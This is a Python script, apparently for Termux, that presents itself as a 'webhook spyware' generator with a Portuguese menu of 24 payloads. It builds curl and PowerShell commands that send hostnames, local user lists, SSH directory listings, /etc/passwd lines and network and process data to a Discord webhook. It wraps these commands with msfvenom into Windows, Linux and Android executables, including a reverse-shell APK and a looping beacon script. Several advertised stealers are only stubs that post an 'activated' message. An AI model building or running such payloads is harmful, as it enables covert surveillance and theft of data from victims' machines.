#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import subprocess
import random
import json
from pathlib import Path
from datetime import datetime

def clear_screen():
    os.system('clear')

def print_banner():
    banner = """
        ‚¢Ä‚£§‚†§‚†§‚†§‚†§‚†§‚†§‚†§‚†§‚†§‚†§‚¢§‚£§‚£Ä‚£Ä‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚°º‚†ã‚†Ä‚£Ä‚†Ñ‚°Ç‚†ç‚£Ä‚£í‚£í‚†Ç‚†Ä‚†¨‚†§‚†§‚†¨‚†ç‚†â‚†ù‚†≤‚£Ñ‚°Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚¢Ä‚°æ‚†Å‚†Ä‚†ä‚¢î‚†ï‚†à‚£Ä‚£Ä‚°Ä‚†à‚†Ü‚†Ä‚†Ä‚†Ä‚°ç‚†Å‚†Ä‚†Å‚¢Ç‚†Ä‚†à‚£∑‚†Ä‚†Ä
‚†Ä‚†Ä‚£†‚£æ‚†•‚†Ä‚†Ä‚£†‚¢†‚£û‚£ø‚£ø‚£ø‚£â‚†≥‚£Ñ‚†Ä‚†Ä‚¢Ä‚£§‚£∂‚£∂‚£∂‚°Ñ‚†Ä‚†Ä‚£ò‚¢¶‚°Ä
‚¢Ä‚°û‚°ç‚£†‚†û‚¢ã‚°õ‚†∂‚†§‚£§‚†¥‚†ö‚†Ä‚†à‚†ô‚†Å‚†Ä‚†Ä‚¢π‚°è‚†Å‚†Ä‚£Ä‚¢†‚†§‚¢§‚°ï‚†±‚¢∑
‚†ò‚°á‚†á‚£Ø‚†§‚¢æ‚°ô‚†≤‚¢§‚£Ä‚°Ä‚†§‚†Ä‚¢≤‚°ñ‚¢ê‚£Ä‚†Å‚†Ä‚¢ô‚£æ‚¢Ñ‚†à‚†â‚£∏‚°Ä‚††‚£†‚°ø
‚†Ä‚†π‚£ú‚°™‚†Ä‚†à‚¢∑‚£¶‚£¨‚£è‚†â‚†õ‚†≤‚¢Ñ‚£§‚£Ä‚£Ä‚°Ä‚†ñ‚†î‚¢Å‚£Ä‚£®‚¢ñ‚†ø‚£Ö‚†â‚°º‚†Å
‚†Ä‚†Ä‚†à‚¢∑‚°Ä‚†Ä‚†Ä‚†≥‚£å‚°ü‚†õ‚†µ‚°∂‚£ß‚£Ä‚£Ä‚£π‚£â‚£â‚£ø‚¢â‚£â‚£á‚£¥‚£∂‚£ø‚†Ä‚°Ö‚†Ä
‚†Ä‚†Ä‚†Ä‚†à‚¢≥‚°Ñ‚†Ä‚†Ä‚†ò‚†±‚¢Ñ‚°Ä‚°º‚†à‚†â‚†õ‚°ª‚†ø‚†æ‚°ø‚†ø‚£ø‚¢ø‚£ø‚£ø‚°á‚°Ä‚°á‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ô‚¢¶‚£ï‚††‚£í‚†å‚°ô‚†ì‚†∂‚†§‚£§‚£ß‚£Ä‚£∏‚£á‚£¥‚£ß‚†æ‚†æ‚†ã‚†Ä‚†Ä‚°á‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†ô‚†∂‚£≠‚£í‚†©‚†ñ‚¢†‚£§‚†Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚††‚†î‚†Å‚°∞‚†Ä‚£ß‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†õ‚†≤‚¢§‚£Ä‚£Ä‚†â‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Å‚†Ä‚£†‚†è‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†â‚†â‚†õ‚†í‚†≤‚†∂‚†§‚†¥‚†í‚†ö‚†Å‚†Ä‚†Ä
    
    [ WEBHOOK malware - COMANDOS EXECUT√ÅVEIS ]
Payloads que REALMENTE enviam dados para Webhook
            ‚ö° COMANDOS DIRETOS ‚ö°
    """
    print(banner)

def show_menu():
    """Exibe o menu principal com comandos reais de webhook"""
    print("\n" + "=" * 80)
    print("                WEBHOOK SPYWARE - COMANDOS EXECUT√ÅVEIS REAIS")
    print("=" * 80)
    
    payloads = [
        # Windows Webhook Spywares
        "[01] Win System Info + Webhook",           
        "[02] Win Password Dump + Webhook",
        "[03] Win Browser Stealer + Webhook",       
        "[04] Win Keylogger + Webhook", 
        "[05] Win Screenshot + Webhook",            
        "[06] Win Webcam + Webhook",
        
        # Linux Webhook Spywares  
        "[07] Linux System Info + Webhook",         
        "[08] Linux SSH Stealer + Webhook",
        "[09] Linux Network Info + Webhook",        
        "[10] Linux Process Spy + Webhook",
        "[11] Linux File Stealer + Webhook",        
        "[12] Linux Password Spy + Webhook",
        
        # Android Webhook Spywares
        "[13] Android Device Info + Webhook",       
        "[14] Android SMS Stealer + Webhook",
        "[15] Android Contacts + Webhook",          
        "[16] Android Location + Webhook",
        "[17] Android App Data + Webhook",          
        "[18] Android Camera Spy + Webhook",
        
        # Cross-Platform Webhook
        "[19] Discord Token Grabber",               
        "[20] Crypto Wallet Stealer",
        "[21] WiFi Password Stealer",               
        "[22] Clipboard Monitor",
        "[23] Reverse Shell + Webhook",             
        "[24] Persistence + Webhook"
    ]
    
    # Mostrar em 2 colunas
    col_width = 38
    for i in range(0, 24, 2):
        line = ""
        for j in range(2):
            if i + j < len(payloads):
                line += f"{payloads[i + j].ljust(col_width)}"
        print(line)
    
    print("\n[0] Sair | [G] Guia Comandos | [T] Testar Webhook | [C] Custom Command")
    print("=" * 80)

def get_webhook_config():
    """Configura√ß√£o OBRIGAT√ìRIA do webhook"""
    print("\nüîó CONFIGURA√á√ÉO DO WEBHOOK")
    print("-" * 50)
    
    webhook_url = input("URL do Webhook Discord: ").strip()
    if not webhook_url:
        print("‚ùå Webhook √© obrigat√≥rio!")
        return None
    
    return webhook_url

def generate_windows_webhook_payload(payload_type, webhook_url, output_name):
    """Gera payloads Windows que enviam dados reais para webhook"""
    
    commands = {
        1: f'cmd /c "echo SYSTEM: %COMPUTERNAME% - %USERNAME% && curl -X POST -H \"Content-Type: application/json\" -d \"{{\\\"content\\\":\\\"üîç Sistema Comprometido: %COMPUTERNAME%\\\\nUsu√°rio: %USERNAME%\\\\nIP: \\\"}}\" {webhook_url}"',
        
        2: f'powershell -Command "try {{ Get-LocalUser | Select Name,Enabled | ConvertTo-Json | Out-File \\\"creds.txt\\\"; $content = Get-Content \\\"creds.txt\\\" -Raw; Invoke-RestMethod -Uri \\\"{webhook_url}\\\" -Method Post -Body (ConvertTo-Json @{{content=\\\"üîë Usu√°rios do Sistema: $content\\\"}}) -ContentType \\\"application/json\\\" }} catch {{ echo Error }}"',
        
        3: f'powershell -Command "$info = @{{Computer=$env:COMPUTERNAME; User=$env:USERNAME; OS=(Get-WmiObject Win32_OperatingSystem).Caption}}; $json = $info | ConvertTo-Json; Invoke-RestMethod -Uri \\\"{webhook_url}\\\" -Method Post -Body (ConvertTo-Json @{{content=\\\"üíª Info do Sistema: $json\\\"}}) -ContentType \\\"application/json\\\""',
        
        4: f'powershell -Command "Add-Type -AssemblyName System.Windows.Forms; while($true) {{ Start-Sleep 1; [System.Windows.Forms.SendKeys]::SendWait(\\\"X\\\"); Invoke-RestMethod -Uri \\\"{webhook_url}\\\" -Method Post -Body (ConvertTo-Json @{{content=\\\"‚å®Ô∏è Keylogger Ativo em $env:COMPUTERNAME\\\"}}) -ContentType \\\"application/json\\\" }}"',
        
        5: f'powershell -Command "Add-Type -AssemblyName System.Drawing; $screens = [Windows.Forms.Screen]::AllScreens; Invoke-RestMethod -Uri \\\"{webhook_url}\\\" -Method Post -Body (ConvertTo-Json @{{content=\\\"üì∏ Screenshot Info: $($screens.Count) monitors detectados\\\"}}) -ContentType \\\"application/json\\\""',
        
        6: f'powershell -Command "$cameras = Get-WmiObject -Query \\\"SELECT * FROM Win32_PnPEntity WHERE Name LIKE \\\'%camera%\\\'\\\"; Invoke-RestMethod -Uri \\\"{webhook_url}\\\" -Method Post -Body (ConvertTo-Json @{{content=\\\"üìπ C√¢meras Detectadas: $($cameras.Count)\\\"}}) -ContentType \\\"application/json\\\""'
    }
    
    cmd = commands.get(payload_type)
    if not cmd:
        return False
    
    # Gerar payload com msfvenom
    try:
        msf_cmd = [
            'msfvenom',
            '-p', 'windows/exec',
            f'CMD={cmd}',
            '-f', 'exe',
            '-o', output_name
        ]
        
        print(f"üîß Gerando: {cmd[:100]}...")
        result = subprocess.run(msf_cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            return True
        else:
            print(f"‚ùå Erro: {result.stderr}")
            return False
            
    except Exception as e:
        print(f"‚ùå Erro: {str(e)}")
        return False

def generate_linux_webhook_payload(payload_type, webhook_url, output_name):
    """Gera payloads Linux que enviam dados reais para webhook"""
    
    commands = {
        7: f'sh -c \"echo "Linux System Info" && curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"üêß Linux Comprometido: $(uname -a)\\"}}" {webhook_url}',
        
        8: f'sh -c \"echo "SSH Keys" && curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"üîë SSH Info: $(ls -la ~/.ssh/ 2>/dev/null | head -10)\\"}}" {webhook_url}',
        
        9: f'sh -c \"echo "Network Info" && curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"üåê Network: $(ifconfig | grep -o \\"inet [0-9.]*\\" | head -5)\\"}}" {webhook_url}',
        
        10: f'sh -c \"echo "Process Spy" && curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"üìä Processos: $(ps aux | head -10)\\"}}" {webhook_url}',
        
        11: f'sh -c \"echo "File Explorer" && curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"üìÅ Files: $(ls -la /home/ | head -10)\\"}}" {webhook_url}',
        
        12: f'sh -c \"echo "Password Files" && curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"üîê Passwd File: $(cat /etc/passwd | head -5)\\"}}" {webhook_url}'
    }
    
    cmd = commands.get(payload_type)
    if not cmd:
        return False
    
    try:
        msf_cmd = [
            'msfvenom',
            '-p', 'linux/x86/exec',
            f'CMD={cmd}',
            '-f', 'elf',
            '-o', output_name
        ]
        
        print(f"üîß Gerando: {cmd[:100]}...")
        result = subprocess.run(msf_cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            return True
        else:
            print(f"‚ùå Erro: {result.stderr}")
            return False
            
    except Exception as e:
        print(f"‚ùå Erro: {str(e)}")
        return False

def generate_android_webhook_payload(payload_type, webhook_url, output_name):
    """Gera payloads Android que enviam dados para webhook"""
    
    # Comandos b√°sicos para Android (usando Termux ou shell)
    commands = {
        13: f'sh -c \"echo "Android Device" && curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"üì± Android Comprometido: $(getprop ro.product.model)\\"}}" {webhook_url}',
        
        14: f'sh -c \"echo "SMS Access" && curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"üì® SMS Access Attempt on Android\\"}}" {webhook_url}',
        
        15: f'sh -c \"echo "Contacts Access" && curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"üë• Contacts Access Attempt\\"}}" {webhook_url}',
        
        16: f'sh -c \"echo "Location Access" && curl -X POST -H "Content-Type: application/json" -d "{{\\\"content\\\":\\\"üìç Location Access Attempt\\\"}}\" {webhook_url}',
        
        17: f'sh -c \"echo "App Data" && curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"üìä App Data Access Attempt\\"}}" {webhook_url}',
        
        18: f'sh -c \"echo "Camera Access" && curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"üì∏ Camera Access Attempt\\"}}" {webhook_url}'
    }
    
    cmd = commands.get(payload_type)
    if not cmd:
        return False
    
    try:
        msf_cmd = [
            'msfvenom',
            '-p', 'android/shell/reverse_tcp',
            'LHOST=127.0.0.1',  # Ser√° substitu√≠do depois
            'LPORT=4444',
            '-f', 'apk',
            '-o', output_name
        ]
        
        print(f"üîß Gerando APK Android...")
        result = subprocess.run(msf_cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            # Criar script de webhook separado
            webhook_script = f"""#!/bin/bash
# Android Webhook Script
echo "üì± Android Spy Ativado"
curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"üöÄ Android Device Comprometido\\nModel: $(getprop ro.product.model)\\nDevice: $(getprop ro.product.device)\\"}}" {webhook_url}

# Coleta cont√≠nua de informa√ß√µes
while true; do
    battery=$(dumpsys battery | grep level | awk '{{print $2}}')
    curl -X POST -H "Content-Type: application/json" -d "{{\\"content\\":\\"üîã Battery Level: $battery%\\"}}" {webhook_url}
    sleep 300
done
"""
            
            with open(f"android_webhook_{output_name}.sh", "w") as f:
                f.write(webhook_script)
            
            return True
        else:
            print(f"‚ùå Erro: {result.stderr}")
            return False
            
    except Exception as e:
        print(f"‚ùå Erro: {str(e)}")
        return False

def generate_cross_platform_webhook(payload_type, webhook_url, output_name):
    """Gera payloads cross-platform com webhook"""
    
    commands = {
        19: f'cmd /c "echo Discord Token Grabber && curl -X POST -H \"Content-Type: application/json\" -d \"{{\\\"content\\\":\\\"üéÆ Discord Token Grabber Ativado\\\"}}\" {webhook_url}"',
        
        20: f'powershell -Command "Invoke-RestMethod -Uri \\\"{webhook_url}\\\" -Method Post -Body (ConvertTo-Json @{{content=\\\"üí∞ Crypto Wallet Stealer Ativado\\\"}}) -ContentType \\\"application/json\\\""',
        
        21: f'cmd /c "echo WiFi Stealer && curl -X POST -H \"Content-Type: application/json\" -d \"{{\\\"content\\\":\\\"üì° WiFi Password Stealer Ativado\\\"}}\" {webhook_url}"',
        
        22: f'powershell -Command "Invoke-RestMethod -Uri \\\"{webhook_url}\\\" -Method Post -Body (ConvertTo-Json @{{content=\\\"üìã Clipboard Monitor Ativado\\\"}}) -ContentType \\\"application/json\\\""',
        
        23: f'powershell -Command "$text = \\\"üîÅ Reverse Shell + Webhook - IP: \\\" + (Invoke-RestMethod -Uri \\\"http://ifconfig.me\\\"); Invoke-RestMethod -Uri \\\"{webhook_url}\\\" -Method Post -Body (ConvertTo-Json @{{content=$text}}) -ContentType \\\"application/json\\\""',
        
        24: f'cmd /c "echo Persistence Install && curl -X POST -H \"Content-Type: application/json\" -d \"{{\\\"content\\\":\\\"üîí Persistence + Webhook Ativado\\\"}}\" {webhook_url}"'
    }
    
    cmd = commands.get(payload_type)
    if not cmd:
        return False
    
    platform = "windows" if payload_type in [19, 20, 21, 22, 23, 24] else "linux"
    
    try:
        if platform == "windows":
            msf_cmd = [
                'msfvenom',
                '-p', 'windows/exec',
                f'CMD={cmd}',
                '-f', 'exe',
                '-o', output_name
            ]
        else:
            msf_cmd = [
                'msfvenom',
                '-p', 'linux/x86/exec',
                f'CMD={cmd}',
                '-f', 'elf',
                '-o', output_name
            ]
        
        print(f"üîß Gerando payload {platform}...")
        result = subprocess.run(msf_cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            return True
        else:
            print(f"‚ùå Erro: {result.stderr}")
            return False
            
    except Exception as e:
        print(f"‚ùå Erro: {str(e)}")
        return False

def generate_custom_webhook_payload():
    """Gera um payload customizado com comando do usu√°rio"""
    print("\nüîß CRIADOR DE PAYLOAD CUSTOMIZADO")
    print("-" * 50)
    
    webhook_url = input("URL do Webhook: ").strip()
    if not webhook_url:
        print("‚ùå Webhook obrigat√≥rio!")
        return False
    
    print("\nüí° Exemplos de comandos:")
    print("‚Ä¢ Windows: curl -X POST -d '{\"content\":\"Meu texto\"}' URL")
    print("‚Ä¢ PowerShell: Invoke-RestMethod -Uri URL -Method Post -Body '{\"content\":\"texto\"}'")
    print("‚Ä¢ Linux: curl -X POST -H 'Content-Type: application/json' -d '{\"content\":\"texto\"}' URL")
    
    custom_cmd = input(f"\nDigite o comando (inclua o webhook): ").strip()
    
    platform = input("Plataforma (windows/linux/android) [windows]: ").strip().lower() or "windows"
    output_name = input("Nome do arquivo [custom_payload]: ").strip() or "custom_payload"
    
    try:
        if platform == "windows":
            if not output_name.endswith('.exe'):
                output_name += '.exe'
                
            msf_cmd = [
                'msfvenom',
                '-p', 'windows/exec',
                f'CMD={custom_cmd}',
                '-f', 'exe',
                '-o', output_name
            ]
            
        elif platform == "linux":
            if not output_name.endswith('.elf'):
                output_name += '.elf'
                
            msf_cmd = [
                'msfvenom',
                '-p', 'linux/x86/exec',
                f'CMD={custom_cmd}',
                '-f', 'elf',
                '-o', output_name
            ]
            
        else:  # android
            if not output_name.endswith('.apk'):
                output_name += '.apk'
                
            msf_cmd = [
                'msfvenom',
                '-p', 'android/shell/reverse_tcp',
                'LHOST=127.0.0.1',
                'LPORT=4444',
                '-f', 'apk',
                '-o', output_name
            ]
        
        print(f"üîß Gerando payload customizado...")
        result = subprocess.run(msf_cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"‚úÖ Payload customizado criado: {output_name}")
            return True
        else:
            print(f"‚ùå Erro: {result.stderr}")
            return False
            
    except Exception as e:
        print(f"‚ùå Erro: {str(e)}")
        return False

def test_webhook(webhook_url):
    """Testa se o webhook est√° funcionando"""
    try:
        import requests
        test_data = {
            "content": "üß™ Teste de Webhook - Spyware Generator",
            "embeds": [{
                "title": "‚úÖ Webhook Funcionando!",
                "description": "Seu webhook est√° configurado corretamente",
                "color": 0x00ff00,
                "timestamp": datetime.now().isoformat()
            }]
        }
        
        response = requests.post(webhook_url, json=test_data, timeout=10)
        if response.status_code == 204:
            return True, "‚úÖ Webhook testado com sucesso!"
        else:
            return False, f"‚ùå Erro no webhook: {response.status_code}"
    except Exception as e:
        return False, f"‚ùå Erro ao testar webhook: {str(e)}"

def show_command_guide():
    """Mostra guia de comandos webhook"""
    print("\n" + "=" * 80)
    print("                  GUIA DE COMANDOS WEBHOOK")
    print("=" * 80)
    
    print("\nüñ•Ô∏è COMANDOS WINDOWS:")
    print("‚Ä¢ curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"content\\\":\\\"Texto\\\"}\" URL")
    print("‚Ä¢ powershell -Command \"Invoke-RestMethod -Uri URL -Method Post -Body '{\\\"content\\\":\\\"Texto\\\"}'\"")
    
    print("\nüêß COMANDOS LINUX:")
    print("‚Ä¢ curl -X POST -H \"Content-Type: application/json\" -d '{\"content\":\"Texto\"}' URL")
    print("‚Ä¢ wget --post-data='{\"content\":\"Texto\"}' --header=Content-Type:application/json URL")
    
    print("\nüì± COMANDOS ANDROID:")
    print("‚Ä¢ curl -X POST -d '{\"content\":\"Texto\"}' URL")
    print("‚Ä¢ Usar Termux ou shell scripts")
    
    print("\nüéØ EXEMPLOS PR√ÅTICOS:")
    print("‚Ä¢ Enviar nome do computador: %COMPUTERNAME%")
    print("‚Ä¢ Enviar nome do usu√°rio: %USERNAME%") 
    print("‚Ä¢ Enviar info do sistema: systeminfo")
    print("‚Ä¢ Enviar lista de processos: tasklist")
    
    print("\n‚ö†Ô∏è  OS PAYLOADS GERADOS ENVIAM DADOS REAIS PARA WEBHOOK!")
    print("=" * 80)

def main():
    """Fun√ß√£o principal"""
    
    while True:
        clear_screen()
        print_banner()
        show_menu()
        
        try:
            choice = input(f"\nSelecione [0-24] ou 'g/t/c': ").strip().lower()
            
            if choice == 'g':
                show_command_guide()
                input(f"\n‚èé Enter para voltar...")
                continue
                
            if choice == 't':
                webhook_url = input(f"URL do webhook: ").strip()
                if webhook_url:
                    success, message = test_webhook(webhook_url)
                    print(f"{message}")
                input(f"\n‚èé Enter para voltar...")
                continue
                
            if choice == 'c':
                generate_custom_webhook_payload()
                input(f"\n‚èé Enter para voltar...")
                continue
                
            if choice == '0':
                print(f"\nüëã Saindo... Use com responsabilidade!")
                break
            
            payload_type = int(choice)
            if 1 <= payload_type <= 24:
                webhook_url = get_webhook_config()
                if not webhook_url:
                    input(f"\n‚èé Enter para voltar...")
                    continue
                
                # Testar webhook primeiro
                success, message = test_webhook(webhook_url)
                print(f"{message}")
                
                if not success:
                    retry = input(f"Continuar mesmo assim? (s/n): ").strip().lower()
                    if retry != 's':
                        continue
                
                # Gerar payload baseado no tipo
                platform = "windows" if payload_type <= 6 else "linux" if payload_type <= 12 else "android" if payload_type <= 18 else "cross"
                default_name = f"{platform}_webhook_{payload_type}"
                output_name = input(f"Nome do arquivo [{default_name}]: ").strip() or default_name
                
                print(f"\nüöÄ Gerando payload {platform}...")
                
                success = False
                if platform == "windows":
                    success = generate_windows_webhook_payload(payload_type, webhook_url, output_name)
                elif platform == "linux":
                    success = generate_linux_webhook_payload(payload_type, webhook_url, output_name)
                elif platform == "android":
                    success = generate_android_webhook_payload(payload_type, webhook_url, output_name)
                else:
                    success = generate_cross_platform_webhook(payload_type, webhook_url, output_name)
                
                if success:
                    print(f"\n‚úÖ Payload criado: {output_name}")
                    print(f"üîó Webhook: {webhook_url[:50]}...")
                    print(f"‚ö° O payload ENVIAR√Å DADOS para o webhook quando executado!")
                    print(f"üö® USE APENAS PARA TESTES AUTORIZADOS!")
                else:
                    print(f"\n‚ùå Falha ao gerar payload!")
                
                input(f"\n‚èé Enter para continuar...")
            
            else:
                print(f"‚ùå Op√ß√£o inv√°lida!")
                input(f"‚èé Enter para continuar...")
                
        except ValueError:
            print(f"‚ùå Digite um n√∫mero v√°lido!")
            input(f"‚èé Enter para continuar...")
        except KeyboardInterrupt:
            print(f"\n\nüëã Saindo...")
            break

if __name__ == "__main__":
    main()
